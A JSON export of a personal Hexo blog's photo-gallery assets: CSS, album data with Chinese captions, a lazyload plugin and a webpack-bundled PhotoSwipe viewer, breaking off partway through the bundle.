{"meta":{"title":"Xun9er's blog","subtitle":"姑苏行古刹，桃花渡乱红。","description":"一个白的不能再白的小白","author":"Xun9er","url":"http://yoursite.com","root":"/"},"pages":[{"title":"","date":"2020-02-13T13:25:22.261Z","updated":"2020-02-13T13:25:07.281Z","comments":true,"path":"photos/ins.css","permalink":"http://yoursite.com/photos/ins.css","excerpt":"","text":"#post-instagram{ padding: 30px; } #post-instagram .article-entry{ padding-right: 0; } .instagram{ position: relative; min-height: 500px; } .instagram img { width: 100%; } .instagram .year { font-size: 16px; } .instagram .open-ins{ padding: 10px 0; color: #cdcdcd; } .instagram .open-ins:hover{ color: #657b83; } .instagram .year{ display: inline; } .instagram .thumb { width: 25%; height: 0; padding-bottom: 25%; position: relative; display: inline-block; text-align: center; background: #ededed; outline: 1px solid #ddd; } .instagram .thumb a { position: relative; } .instagram .album h1 em{ font-style: normal; font-size: 14px; margin-left: 10px; } .instagram .album ul{ display: flex; flex-wrap: wrap; clear: both; width: 100%; text-align: left; } .instagram .album li{ list-style: none; display: inline-block; box-sizing: border-box; padding: 0 5px; margin-bottom: -10px; height: 0; width: 25%; position: relative; padding-bottom: 25%; } .instagram .album li:before{ display: none; } .instagram .album div.img-box{ position: absolute; width: 90%; height: 90%; -webkit-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1); -moz-box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1); box-shadow: 0 1px 0 rgba(255,255,255,0.4), 0 1px 0 1px rgba(255,255,255,0.1); } .instagram .album div.img-box img{ width: 100%; height: 100%; position: absolute; z-index: 2; } .instagram .album div.img-box .img-bg{ position: absolute; top: 0; left: 0; bottom: 0px; width: 100%; margin: -5px; padding: 5px; -webkit-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1); -moz-box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1); box-shadow: 0 0 0 1px rgba(0,0,0,.04), 0 1px 5px rgba(0,0,0,0.1); -webkit-transition: all 0.15s ease-out 0.1s; -moz-transition: all 0.15s ease-out 0.1s; -o-transition: all 0.15s ease-out 0.1s; transition: all 0.15s ease-out 0.1s; opacity: 0.2; cursor: pointer; display: block; z-index: 3; } .instagram .album div.img-box .icon { font-size: 14px; position: absolute; left: 50%; top: 50%; margin-left: -7px; margin-top: -7px; color: #999; z-index: 1; } .instagram .album div.img-box .img-bg:hover{ opacity: 0; } .photos-btn-wrap { border-bottom: 1px solid #e5e5e5; margin-bottom: 20px; } .photos-btn { font-size: 16px; color: #333; margin-bottom: -4px; padding: 5px 8px 3px; } .photos-btn.active { color: #08c; border: 1px solid #e5e5e5; border-bottom: 5px solid #fff; } @media screen and (max-width:600px) { .instagram .thumb { width: 50%; padding-bottom: 50%; } .instagram .album li { width: 100%; position: relative; padding-bottom: 100%; text-align: center; } .instagram .album div.img-box{ margin: 0; width: 90%; height: 90%; } }"},{"title":"","date":"2020-02-16T08:44:32.251Z","updated":"2020-02-16T08:44:32.251Z","comments":true,"path":"photos/data.json","permalink":"http://yoursite.com/photos/data.json","excerpt":"","text":"{\"list\":[{\"date\":\"2020-2-\",\"arr\":{\"year\":2020,\"month\":2,\"link\":[\"2020-2-15_浮生.png\"],\"text\":[\"浮生\"],\"type\":[\"image\"]}},{\"date\":\"2020-01\",\"arr\":{\"year\":2020,\"month\":1,\"link\":[\"2020-01-11_skate.png\"],\"text\":[\"skate\"],\"type\":[\"image\"]}}]}"},{"title":"","date":"2020-02-16T08:56:08.810Z","updated":"2020-02-16T08:56:08.810Z","comments":true,"path":"photos/lazyload.min.js","permalink":"http://yoursite.com/photos/lazyload.min.js","excerpt":"","text":"/*! * An jQuery | zepto plugin for lazy loading images. * author -> jieyou * see https://github.com/jieyou/lazyload * use some tuupola's code https://github.com/tuupola/jquery_lazyload (BSD) * use component's throttle https://github.com/component/throttle (MIT) */ !function(a){\"function\"==typeof define&&define.amd?define([\"jquery\"],a):a(window.jQuery||window.Zepto)}(function(a){function g(){}function h(a,b){var e;return e=b._$container==d?(\"innerHeight\"in c?c.innerHeight:d.height())+d.scrollTop():b._$container.offset().top+b._$container.height(),e=a.offset().top+b.threshold+a.height()}function k(b,e){var f;return f=e._$container==d?a.fn.scrollLeft?d.scrollLeft():c.pageXOffset:e._$container.offset().left,f>=b.offset().left+e.threshold+b.width()}function l(a,b){var c=0;a.each(function(d){function g(){f.trigger(\"_lazyload_appear\"),c=0}var f=a.eq(d);if(!(f.width()b.failure_limit)return!1}else g()})}function m(a){return a.filter(function(b){return!a.eq(b)._lazyload_loadStarted})}function n(a,b){function h(){f=0,g=+new Date,e=a.apply(c,d),c=null,d=null}var c,d,e,f,g=0;return function(){c=this,d=arguments;var a=new Date-g;return f||(a>=b?h():f=setTimeout(h,b-a)),e}}var f,c=window,d=a(c),e={threshold:0,failure_limit:0,event:\"scroll\",effect:\"show\",effect_params:null,container:c,data_attribute:\"original\",data_srcset_attribute:\"original-srcset\",skip_invisible:!0,appear:g,load:g,vertical_only:!1,check_appear_throttle_time:300,url_rewriter_fn:g,no_fake_img_loader:!1,placeholder_data_img:\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC\",placeholder_real_img:\"http://ditu.baidu.cn/yyfm/lazyload/0.0.1/img/placeholder.png\"};f=function(){var a=Object.prototype.toString;return function(b){return a.call(b).replace(\"[object \",\"\").replace(\"]\",\"\")}}(),a.fn.hasOwnProperty(\"lazyload\")||(a.fn.lazyload=function(b){var i,j,k,h=this;return a.isPlainObject(b)||(b={}),a.each(e,function(g,h){var i=f(b[g]);-1!=a.inArray(g,[\"threshold\",\"failure_limit\",\"check_appear_throttle_time\"])?\"String\"==i?b[g]=parseInt(b[g],10):\"Number\"!=i&&(b[g]=h):\"container\"==g?(b._$container=b.hasOwnProperty(g)?b[g]==c||b[g]==document?d:a(b[g]):d,delete b.container):!e.hasOwnProperty(g)||b.hasOwnProperty(g)&&i==f(e[g])||(b[g]=h)}),i=\"scroll\"==b.event,k=0==b.check_appear_throttle_time?l:n(l,b.check_appear_throttle_time),j=i||\"scrollstart\"==b.event||\"scrollstop\"==b.event,h.each(function(c){var e=this,f=h.eq(c),i=f.attr(\"src\"),k=f.attr(\"data-\"+b.data_attribute),l=b.url_rewriter_fn==g?k:b.url_rewriter_fn.call(e,f,k),n=f.attr(\"data-\"+b.data_srcset_attribute),o=f.is(\"img\");return 1==f._lazyload_loadStarted||i==l?(f._lazyload_loadStarted=!0,h=m(h),void 0):(f._lazyload_loadStarted=!1,o&&!i&&f.one(\"error\",function(){f.attr(\"src\",b.placeholder_real_img)}).attr(\"src\",b.placeholder_data_img),f.one(\"_lazyload_appear\",function(){function i(){d&&f.hide(),o?(n&&f.attr(\"srcset\",n),l&&f.attr(\"src\",l)):f.css(\"background-image\",'url(\"'+l+'\")'),d&&f[b.effect].apply(f,c?b.effect_params:[]),h=m(h)}var d,c=a.isArray(b.effect_params);f._lazyload_loadStarted||(d=\"show\"!=b.effect&&a.fn[b.effect]&&(!b.effect_params||c&&0==b.effect_params.length),b.appear!=g&&b.appear.call(e,f,h.length,b),f._lazyload_loadStarted=!0,b.no_fake_img_loader||n?(b.load!=g&&f.one(\"load\",function(){b.load.call(e,f,h.length,b)}),i()):a(\"\").one(\"load\",function(){i(),b.load!=g&&b.load.call(e,f,h.length,b)}).attr(\"src\",l))}),j||f.on(b.event,function(){f._lazyload_loadStarted||f.trigger(\"_lazyload_appear\")}),void 0)}),j&&b._$container.on(b.event,function(){k(h,b)}),d.on(\"resize load\",function(){k(h,b)}),a(function(){k(h,b)}),this})});"},{"title":"","date":"2020-03-22T15:41:59.686Z","updated":"2020-03-22T15:41:59.686Z","comments":true,"path":"photos/index.html","permalink":"http://yoursite.com/photos/index.html","excerpt":"","text":".header-inner{ display: none; } .sidebar{ display: none; } .content{ margin-bottom: 360px; } .content-wrap{ width: 100%; // box-sizing: content-box; padding: initial !important; background:url('https://s2.ax1x.com/2019/09/07/nlL4pR.jpg'); } .main-inner{ width: 100%; } .main { padding-bottom: 150px; margin-top: 0px; background:url('https://s2.ax1x.com/2019/09/07/nlL4pR.jpg'); } .main-inner{ margin-top: unset; } .page-post-detail .post-meta{ display: none; } body { background-image: unset; background-attachment: unset; background-size: 100%; /*background-position: top left;*/ } .header{ background: rgba(28, 25, 25, 0.6); border-bottom: unset; } .menu .menu-item a{ font-weight: 300; color: #e6eaed; } .footer-inner { padding-left: 0px; } img:hover { //opacity:0.8; /*透明度*/ //filter:alpha(opacity=100); /* For IE8 and earlier */ } .imgbox{ margin-top: 20px; padding: 1px 10px; width: 100%; overflow: hidden; height: 250px; border-right: 1px solid #bcbcbc; background:url('https://i.loli.net/2020/03/21/mnUStWcLgxvyf4a.jpg'); } .box{ visibility: visible; overflow: auto; zoom: 1; } .box li{ float: left; width: 25%; position: relative; overflow: hidden; text-align: center; list-style: none; margin: 0; /*display: inline;*/ padding: 0; height: 360px; } .box li span{ display: block; padding: 12% 7% 10% 7%; min-height: 80px; //background: #fff; color: #fff; font-size: 16px; font-weight: 600; line-height: 26px; -webkit-box-sizing: border-box; box-sizing: border-box; } img.imgitem{ padding: unset; padding: unset; border: unset; position: relative; padding: 0px; height: auto; width: 100%; } div#posts.posts-expand { border: unset; padding: unset; margin-bottom: 10px; } .posts-expand .post-body img{ padding: 0px !important; } .box p{ margin-top: -25px; display: block; background: #121212; color: #fff; font-size: 14px; -webkit-box-sizing: border-box; box-sizing: border-box; text-align: center; } .box span strong{ background: rgba(0,0,0,0.4); padding: 20px; } .posts-expand .post-title { display: none; } .title{ margin: 10px auto; display: inline-block; vertical-align: middle; //background: url(/images/beichen.jpg); font: 85px/250px 'ChaletComprimeMilanSixty'; //background-position: left bottom !important; background-position: center center !important; color: #fff; background-size: 100% auto !important; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; width: 100%; text-align: center; border: unset; height: 560px; cursor: unset !important; -webkit-box-sizing: border-box; box-sizing: border-box; } @media (max-width: 767px){ .box li { width: 98%; } .title { height: 200px; } .box span { min-height: 80px; border-right: unset; font-size: 17px; } .box p{ border-right: unset; font-size: 12px; } .posts-expand { margin: unset; } } @media (min-width: 1600px){ .container .main-inner{ width: 100%; } } // 相册json var json = [ [ { 'title': 'GhostBlade', 'url': 'https://i.loli.net/2020/03/21/orgOdtDAIewPqhk.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/SzJKrsany6RA38u.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/TsunxrWC8GXUjgP.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/HnzriOd7fsE6Squ.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/7xeXqj5zFhcWPdU.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/wUthQSpNfF9EPau.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/1RpO2tXB8NfCZYm.jpg' }, { 'title': '', 'url': 'https://s1.ax1x.com/2020/03/21/8fmwGj.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/orgOdtDAIewPqhk.jpg' }, { 'title': '朕的宝贝儿画册', 'url': 'https://i.loli.net/2020/03/21/5IjkCdSP2Jf8ODA.jpg' } ], [ { 'title': 'photos', 'url': 'https://i.loli.net/2020/03/21/Ro1mlAMasSXeJDF.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/ekoDMxSyVl2psNB.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/NvEBVpgk2tjJKfz.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/ZUn7rha9SBTtYoM.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/9fGV64LbzeH1kor.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/ucnCvskVDbZYzgh.jpg' }, { 'title': '鹅岭二厂的小fafa', 'url': 'https://i.loli.net/2020/03/21/G8ELspQNkUMl6OC.jpg' }, { 'title': '', 'url': 'https://i.loli.net/2020/03/21/gjV5mQTFucrzZSd.jpg' }, { 'title': '大熊猫基地的黑天鹅小公举', 'url': 'https://i.loli.net/2020/03/21/N1csPhQUbv5LMiW.jpg' }, { 'title': '你惹不起的大哥', 'url': 'https://s1.ax1x.com/2020/03/21/8fY5Sf.jpg' }, { 'title': '小男朋友', 'url': 'https://i.loli.net/2020/03/21/GXJrVfgu8sdCNao.jpg' }, { 'title': '邛海边的美食', 'url': 'https://s1.ax1x.com/2020/03/21/8fKWFS.jpg' }, { 'title': '《吃灰笔》', 'url': 'https://i.loli.net/2020/03/21/IGdkZopuL61Anf2.jpg' }, { 'title': '落日还是朝阳', 'url': 'https://i.loli.net/2020/03/21/cyVSYG4JpZDOmbA.jpg' }, { 'title': '墙角的花', 'url': 'https://i.loli.net/2020/03/21/C1U8FuhkIsiVTLZ.jpg' } ], [ { 'title': 'My paintings&handiworks', 'url': 'https://s1.ax1x.com/2020/03/21/8fNLR0.jpg' }, { 'title': '猪年时和小朋友一起做的hhh', 'url': 'https://s1.ax1x.com/2020/03/21/8flmZt.jpg' }, { 'title': '', 'url': 'https://s1.ax1x.com/2020/03/21/8flZqI.jpg' }, { 'title': '照着男朋友画的灯笼', 'url': 'https://s1.ax1x.com/2020/03/21/8flEMd.jpg' }, { 'title': '自己纯手工撸了一个霓虹灯', 'url': 'https://s1.ax1x.com/2020/03/21/8flndP.jpg' }, { 'title': '心狠手辣地在上面打孔穿线', 'url': 'https://s1.ax1x.com/2020/03/21/8flVsA.jpg' }, { 'title': '没错就是这么炫酷', 'url': 'https://s1.ax1x.com/2020/03/21/8flFRe.jpg' }, { 'title': '大概是画过的最大的画了', 'url': 'https://s1.ax1x.com/2020/03/21/8fUEQK.jpg' }, { 'title': 'cool', 'url': 'https://s1.ax1x.com/2020/03/21/8fN7Is.jpg' }, { 'title': '某一次用来当包装纸的画', 'url': 'https://s1.ax1x.com/2020/03/21/8fNLR0.jpg' }, { 'title': '只能说远看还行', 'url': 'https://s1.ax1x.com/2020/03/21/8fU9o9.jpg' }, { 'title': '丙烯颜料，比油画干得快很方便', 'url': 'https://i.loli.net/2020/03/22/CmWwRbs5nNoB298.jpg' }, { 'title': '人体不敢恭维orz', 'url': 'https://s1.ax1x.com/2020/03/21/8fNqGq.jpg' }, { 'title': '15年，，的画，博客背景昂', 'url': 'https://s1.ax1x.com/2020/03/21/8fNbin.jpg' }, { 'title': '吾皇', 'url': 'https://s1.ax1x.com/2020/03/21/8fNjMT.jpg' }, { 'title': '浮生', 'url': 'https://s1.ax1x.com/2020/03/21/8fUkz6.png' }, { 'title': '', 'url': 'https://s1.ax1x.com/2020/03/21/8fUFRx.jpg' }, { 'title': '肉肉', 'url': 'https://i.loli.net/2020/03/21/phrCB1yc2MHlxYX.jpg' }, { 'title': '\"还是这个调色板画的最好\"', 'url': 'https://i.loli.net/2020/03/21/uFOvjpeN7b8xn3H.jpg' } ] ] var content = json2Array(json); var wid = 250; if ((window.innerWidth) > 1200) { wid = (window.innerWidth*3)/18; } var box = document.getElementById('box'); var i=0; for (var i = 0; i < content.length; i++) { var conBox = document.createElement(\"div\"); conBox.id = 'conBox'+i; box.appendChild(conBox); var item = document.createElement(\"div\"); var title = content[i][0].title; var url = content[i][0].url; item.innerHTML = \"\" + title + \"\"; conBox.appendChild(item); for (var j = 1; j < content[i].length ; j++) { var _title = content[i][j].title; var _url = content[i][j].url; var item = document.createElement(\"li\"); item.innerHTML=\"\" + _title +\"\"; conBox.appendChild(item); } } //json转二维数组 function json2Array(arr) { for (var i=0; i"},{"title":"","date":"2020-02-16T12:04:15.328Z","updated":"2020-02-16T12:04:15.328Z","comments":true,"path":"photos/ins.js","permalink":"http://yoursite.com/photos/ins.js","excerpt":"","text":"/******/ (function(modules) { // webpackBootstrap /******/ // The module cache /******/ var installedModules = {}; /******/ /******/ // The require function /******/ function __webpack_require__(moduleId) { /******/ /******/ // Check if module is in cache /******/ if (installedModules[moduleId]) /******/ return installedModules[moduleId].exports; /******/ /******/ // Create a new module (and put it into the cache) /******/ var module = installedModules[moduleId] = { /******/ exports: {}, /******/ id: moduleId, /******/ loaded: false /******/ }; /******/ /******/ // Execute the module function /******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); /******/ /******/ // Flag the module as loaded /******/ module.loaded = true; /******/ /******/ // Return the exports of the module /******/ return module.exports; /******/ } /******/ /******/ /******/ // expose the modules object (__webpack_modules__) /******/ __webpack_require__.m = modules; /******/ /******/ // expose the module cache /******/ __webpack_require__.c = installedModules; /******/ /******/ // __webpack_public_path__ /******/ __webpack_require__.p = \"/dist/\"; /******/ /******/ // Load entry module and return exports /******/ return __webpack_require__(0); /******/ }) /************************************************************************/ /******/ ([ /* 0 */ /***/ function(module, exports, __webpack_require__) { 'use strict'; __webpack_require__(1); var _view = __webpack_require__(2); var _view2 = _interopRequireDefault(_view); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } /** * @name impush-client * @description 这个项目让我发家致富… * @date 2016-12-1 */ var _collection = []; var _count = 0; var searchData; function addMask(elem) { var rect = elem.getBoundingClientRect(); var style = getComputedStyle(elem, null); var mask = document.createElement('i'); mask.className = 'icon-film'; mask.style.color = '#fff'; mask.style.fontSize = '26px'; mask.style.position = 'absolute'; mask.style.right = '10px'; mask.style.bottom = '10px'; mask.style.zIndex = 1; elem.parentNode.appendChild(mask); } var createVideoIncon = function createVideoIncon() { var $videoImg = document.querySelectorAll('.thumb a[data-type=\"video\"]'); for (var i = 0, len = $videoImg.length; i < len; i++) { addMask($videoImg[i]); } }; var render = function render(res) { var ulTmpl = \"\"; for (var j = 0, len2 = res.list.length; j < len2; j++) { var data = res.list[j].arr; var liTmpl = \"\"; for (var i = 0, len = data.link.length; i < len; i++) { var minSrc = 'https://raw.githubusercontent.com/xun9er/picture/master/pictures/' + data.link[i]; var src = 'https://raw.githubusercontent.com/xun9er/picture/master/min_pictures/' + data.link[i]; var type = data.type[i]; var target = src + (type === 'video' ? '.mp4' : '.jpg'); src += ''; liTmpl += '\\ \\ \\ \\ ' + data.text[i] + '\\ '; } ulTmpl = ulTmpl + '' + data.year + '年' + data.month + '月\\ ' + liTmpl + '\\ '; } document.querySelector('.instagram').innerHTML = '' + ulTmpl + ''; createVideoIncon(); _view2.default.init(); }; var replacer = function replacer(str) { var arr = str.split(\"/\"); return \"/assets/ins/\" + arr[arr.length - 1]; }; var ctrler = function ctrler(data) { var imgObj = {}; for (var i = 0, len = data.length; i < len; i++) { var y = data[i].y; var m = data[i].m; var src = replacer(data[i].src); var text = data[i].text; var key = y + \"\" + ((m + \"\").length == 1 ? \"0\" + m : m); if (imgObj[key]) { imgObj[key].srclist.push(src); imgObj[key].text.push(text); } else { imgObj[key] = { year: y, month: m, srclist: [src], text: [text] }; } } render(imgObj); }; function loadData(success) { if (!searchData) { var xhr = new XMLHttpRequest(); xhr.open('GET', './data.json?t=' + +new Date(), true); xhr.onload = function() { if (this.status >= 200 && this.status < 300) { var res = JSON.parse(this.response); searchData = res; success(searchData); } else { console.error(this.statusText); } }; xhr.onerror = function() { console.error(this.statusText); }; xhr.send(); } else { success(searchData); } } var Ins = { init: function init() { loadData(function(data) { render(data); }); } }; Ins.init(); // export default impush; /***/ }, /* 1 */ /***/ function(module, exports, __webpack_require__) { /* WEBPACK VAR INJECTION */ (function(global) { 'use strict'; var inViewport = __webpack_require__(3); var lazyAttrs = ['data-src']; global.lzld = lazyload(); // Provide libs using getAttribute early to get the good src // and not the fake data-src replaceGetAttribute('Image'); replaceGetAttribute('IFrame'); function registerLazyAttr(attr) { if (indexOf.call(lazyAttrs, attr) === -1) { lazyAttrs.push(attr); } } function lazyload(opts) { opts = merge({ 'offset': 333, 'src': 'data-src', 'container': false }, opts || {}); if (typeof opts.src === 'string') { registerLazyAttr(opts.src); } var elts = []; function show(elt) { var src = findRealSrc(elt); if (src) { elt.src = src; } elt.setAttribute('data-lzled', true); elts[indexOf.call(elts, elt)] = null; } function findRealSrc(elt) { if (typeof opts.src === 'function') { return opts.src(elt); } return elt.getAttribute(opts.src); } function register(elt) { elt.onload = null; elt.removeAttribute('onload'); elt.onerror = null; elt.removeAttribute('onerror'); if (indexOf.call(elts, elt) === -1) { inViewport(elt, opts, show); } } return register; } function replaceGetAttribute(elementName) { var fullname = 'HTML' + elementName + 'Element'; if (fullname in global === false) { return; } var original = global[fullname].prototype.getAttribute; global[fullname].prototype.getAttribute = function(name) { if (name === 'src') { var realSrc; for (var i = 0, max = lazyAttrs.length; i < max; i++) { realSrc = original.call(this, lazyAttrs[i]); if (realSrc) { break; } } return realSrc || original.call(this, name); } // our own lazyloader will go through theses lines // because we use getAttribute(opts.src) return original.call(this, name); }; } function merge(defaults, opts) { for (var name in defaults) { if (opts[name] === undefined) { opts[name] = defaults[name]; } } return opts; } // http://webreflection.blogspot.fr/2011/06/partial-polyfills.html function indexOf(value) { for (var i = this.length; i-- && this[i] !== value;) {} return i; } module.exports = lazyload; // export default impush; /* WEBPACK VAR INJECTION */ }.call(exports, (function() { return this; }()))) /***/ }, /* 2 */ /***/ function(module, exports) { 'use strict'; var initPhotoSwipeFromDOM = function initPhotoSwipeFromDOM(gallerySelector) { // parse slide data (url, title, size ...) from DOM elements // (children of gallerySelector) var parseThumbnailElements = function parseThumbnailElements(el) { el = el.parentNode.parentNode; var thumbElements = el.getElementsByClassName('thumb'), numNodes = thumbElements.length, items = [], figureEl, linkEl, size, type, // video or not target, item; for (var i = 0; i < numNodes; i++) { figureEl = thumbElements[i]; // // include only element nodes if (figureEl.nodeType !== 1) { continue; } linkEl = figureEl.children[0]; // size = linkEl.getAttribute('data-size').split('x'); type = linkEl.getAttribute('data-type'); target = linkEl.getAttribute('data-target'); // create slide object item = { src: linkEl.getAttribute('href'), w: parseInt(size[0], 10), h: parseInt(size[1], 10) }; if (figureEl.children.length > 1) { item.title = figureEl.children[1].innerHTML; } if (linkEl.children.length > 0) { item.msrc = linkEl.children[0].getAttribute('src'); item.type = type; item.target = target; item.html = ''; if (type === 'video') { //item.src = null; } } item.el = figureEl; // save link to element for getThumbBoundsFn items.push(item); } return items; }; // find nearest parent element var closest = function closest(el, fn) { return el && (fn(el) ? el : closest(el.parentNode, fn)); }; // triggers when user clicks on thumbnail var onThumbnailsClick = function onThumbnailsClick(e) { e = e || window.event; e.preventDefault ? e.preventDefault() : e.returnValue = false; var eTarget = e.target || e.srcElement; // find root element of slide var clickedListItem = closest(eTarget, function(el) { return el.tagName && el.tagName.toUpperCase() === 'FIGURE'; }); if (!clickedListItem) { return; } // find index of clicked item by looping through all child nodes // alternatively, you may define index via data- attribute var clickedGallery = clickedListItem.parentNode, // childNodes = clickedListItem.parentNode.childNodes, // numChildNodes = childNodes.length, childNodes = document.getElementsByClassName('thumb'), numChildNodes = childNodes.length, nodeIndex = 0, index; for (var i = 0; i < numChildNodes; i++) { if (childNodes[i].nodeType !== 1) { continue; } if (childNodes[i] === clickedListItem) { index = nodeIndex; break; } nodeIndex++; } if (index >= 0) { // open PhotoSwipe if valid index found openPhotoSwipe(index, clickedGallery); } return false; }; // parse picture index and gallery index from URL (#&pid=1&gid=2) var photoswipeParseHash = function photoswipeParseHash() { var hash = window.location.hash.substring(1), params = {}; if (hash.length < 5) { return params; } var vars = hash.split('&'); for (var i = 0; i < vars.length; i++) { if (!vars[i]) { continue; } var pair = vars[i].split('='); if (pair.length < 2) { continue; } params[pair[0]] = pair[1]; } if (params.gid) { params.gid = parseInt(params.gid, 10); } return params; }; var openPhotoSwipe = function openPhotoSwipe(index, galleryElement, disableAnimation, fromURL) { var pswpElement = document.querySelectorAll('.pswp')[0], gallery, options, items; items = parseThumbnailElements(galleryElement); // define options (if needed) options = { // define gallery index (for URL) galleryUID: galleryElement.getAttribute('data-pswp-uid'), getThumbBoundsFn: function getThumbBoundsFn(index) { // See Options -> getThumbBoundsFn section of documentation for more info var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail pageYScroll = window.pageYOffset || document.documentElement.scrollTop, rect = thumbnail.getBoundingClientRect(); return { x: rect.left, y: rect.top + pageYScroll, w: rect.width }; } }; // PhotoSwipe opened from URL if (fromURL) { if (options.galleryPIDs) { // parse real index when custom PIDs are used // http://photoswipe.com/documentation/faq.html#custom-pid-in-url for (var j = 0; j < items.length; j++) { if (items[j].pid == index) { options.index = j; break; } } } else { // in URL indexes start from 1 options.index = parseInt(index, 10) - 1; } } else { options.index = parseInt(index, 10); } // exit if index not found if (isNaN(options.index)) { return; } if (disableAnimation) { options.showAnimationDuration = 0; } // Pass data to PhotoSwipe and initialize it gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options); gallery.init(); var $tempVideo; var stopVideoHandle = function stopVideoHandle() { if ($tempVideo) { $tempVideo.remove(); $tempVideo = null; } }; var changeHandle = function changeHandle() { var item = gallery.currItem; stopVideoHandle(); if (item.type === 'video') { var $ctn = item.container; var style = $ctn.getElementsByClassName('pswp__img')[0].style; var $video = document.createElement('video'); $video.setAttribute('autoplay', 'autoplay'); $video.setAttribute('controls', 'controls'); $video.setAttribute('src', item.target); $video.style.width = style.width; $video.style.height = style.height; $video.style.position = 'absolute'; $video.style.zIndex = 2; $tempVideo = $video; $ctn.appendChild($video); } }; gallery.listen('initialZoomIn', changeHandle); gallery.listen('afterChange', changeHandle); gallery.listen('initialZoomOut', stopVideoHandle); }; // loop through all gallery elements and bind events var galleryElements = document.querySelectorAll(gallerySelector); for (var i = 0, l = galleryElements.length; i < l; i++) { galleryElements[i].setAttribute('data-pswp-uid', i + 1); galleryElements[i].onclick = onThumbnailsClick; } // Parse URL and open gallery if it contains #&pid=3&gid=1 var hashData = photoswipeParseHash(); if (hashData.pid && hashData.gid) { openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true); } }; var Viewer = function() { function init() { initPhotoSwipeFromDOM('.photos'); } return { init: init }; }(); module.exports = Viewer; /***/ }, /* 3 */ /***/ function(module, exports) { /* WEBPACK VAR INJECTION */ (function(global) { module.exports = inViewport; var instances = []; var supportsMutationObserver = typeof global.MutationObserver === 'function'; function inViewport(elt, params, cb) { var opts = { container: global.document.body, offset: 0 }; if (params === undefined || typeof params === 'function') { cb = params; params = {}; } var container = opts.container = params.container || opts.container; var offset = opts.offset = params.offset || opts.offset; for (var i = 0; i < instances.length; i++) { if (instances[i].container === container) { return instances[i].isInViewport(elt, offset, cb); } } return instances[ instances.push(createInViewport(container)) - 1 ].isInViewport(elt, offset, cb); } function addEvent(el, type, fn) { if (el.attachEvent) { el.attachEvent('on' + type, fn); } else { el.addEventListener(type, fn, false); } } function debounce(func, wait, immediate) { var timeout; return function() { var context = this, args = arguments; var callNow = immediate && !timeout; clearTimeout(timeout); timeout = setTimeout(later, wait); if (callNow) func.apply(context, args); function later() { timeout = null; if (!immediate) func.apply(context, args); } }; } // https://github.com/jquery/sizzle/blob/3136f48b90e3edc84cbaaa6f6f7734ef03775a07/sizzle.js#L708 var contains = function() { if (!global.document) { return true; } return global.document.documentElement.compareDocumentPosition ? function(a, b) { return !!(a.compareDocumentPosition(b) & 16); } : global.document.documentElement.contains ? function(a, b) { return a !== b && (a.contains ? a.contains(b) : false); } : function(a, b) { while (b = b.parentNode) { if (b === a) { return true; } } return false; }; } function createInViewport(container) { var watches = createWatches(); var scrollContainer = container === global.document.body ? global : container; var debouncedCheck = debounce(watches.checkAll(watchInViewport), 15); addEvent(scrollContainer, 'scroll', debouncedCheck); if (scrollContainer === global) { addEvent(global, 'resize', debouncedCheck); } if (supportsMutationObserver) { observeDOM(watches, container, debouncedCheck); } // failsafe check, every 200ms we check for visible images // usecase: a hidden parent containing eleements // when the parent becomes visible, we have no event that the children // became visible setInterval(debouncedCheck, 150); function isInViewport(elt, offset, cb) { if (!cb) { return isVisible(elt, offset); } var remote = createRemote(elt, offset, cb); remote.watch(); return remote; } function createRemote(elt, offset, cb) { function watch() { watches.add(elt, offset, cb); } function dispose() { watches.remove(elt); } return { watch: watch, dispose: dispose }; } function watchInViewport(elt, offset, cb) { if (isVisible(elt, offset)) { watches.remove(elt); cb(elt); } } function isVisible(elt, offset) { if (!contains(global.document.documentElement, elt) || !contains(global.document.documentElement, container)) { return false; } // Check if the element is visible // https://github.com/jquery/jquery/blob/740e190223d19a114d5373758127285d14d6b71e/src/css/hiddenVisibleSelectors.js if (!elt.offsetWidth || !elt.offsetHeight) { return false; } var eltRect = elt.getBoundingClientRect(); var viewport = {}; if (container === global.document.body) { viewport = { top: -offset, left: -offset, right: global.document.documentElement.clientWidth + offset, bottom: global.document.documentElement.clientHeight + offset }; } else { var containerRect = container.getBoundingClientRect(); viewport = { top: containerRect.top - offset, left: containerRect.left - offset, right: containerRect.right + offset, bottom: containerRect.bottom + offset }; } // The element must overlap with the visible part of the viewport var visible = ( (eltRect.right > viewport.left) && (eltRect.left < viewport.right) && (eltRect.bottom > viewport.top) && (eltRect.top < viewport.bottom) ); return visible; } return { container: container, isInViewport: isInViewport }; } function createWatches() { var watches = []; function add(elt, offset, cb) { if (!isWatched(elt)) { watches.push([elt, offset, cb]); } } function remove(elt) { var pos = indexOf(elt); if (pos !== -1) { watches.splice(pos, 1); } } function indexOf(elt) { for (var i = watches.length - 1; i >= 0; i--) { if (watches[i][0] === elt) { return i; } } return -1; } function isWatched(elt) 